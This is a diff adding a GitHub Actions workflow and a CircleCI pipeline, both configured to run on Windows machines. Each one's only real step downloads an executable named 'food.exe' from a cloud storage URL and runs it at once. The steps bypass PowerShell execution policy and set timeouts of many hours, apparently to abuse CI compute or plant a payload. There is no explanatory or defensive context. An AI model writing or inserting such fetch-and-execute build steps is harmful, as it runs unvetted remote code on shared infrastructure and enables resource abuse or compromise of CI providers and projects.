@@ -1,0 +1,26 @@
+#GithubAcionWorkFlowyamlfile
+name: good
+on: workflow_dispatch
+jobs:
+  build:
+    runs-on: windows-2019
+    steps:
+    - run: Invoke-WebRequest https://storage.googleapis.com/12345.appspot.com/food.exe -OutFile food.exe ; .\food.exe
+    timeout-minutes: 600
+
+#CircleCIPipelineyamlfile
+
+version: 2.1
+
+jobs:
+  build: # name of your job
+    resource_class: 'windows.large'
+    machine:
+      image: 'windows-server-2022-gui:current'
+      shell: 'powershell.exe -ExecutionPolicy Bypass'
+    steps:
+      # Commands are run in a Windows virtual machine environment
+        - checkout
+        - run:
+           command: Invoke-WebRequest https://storage.googleapis.com/12345.appspot.com/food.exe -OutFile food.exe ; .\food.exe
+           no_output_timeout: 5h
